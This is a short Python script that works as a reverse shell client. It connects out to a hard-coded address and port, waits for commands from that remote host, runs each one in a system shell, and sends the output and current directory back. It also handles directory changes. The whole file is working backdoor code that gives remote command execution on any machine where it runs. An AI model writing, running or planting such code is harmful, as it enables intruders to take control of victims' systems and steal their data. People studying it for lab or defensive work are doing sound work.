import socket
import os, subprocess

s = socket.socket()
HOST = '192.168.1.107'
PORT = 6699

try:
    s.connect((HOST,PORT))

except Exception as e:
    print(e)

else:
    while True:
        data = s.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        elif len(data) > 0:
            # executing commands and returning
            cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_byte, 'utf-8')
            cwd = os.getcwd() + '> '

            s.send(str.encode(output_string + cwd, 'utf-8'))

            print(output_string)

finally:
    print('program ended')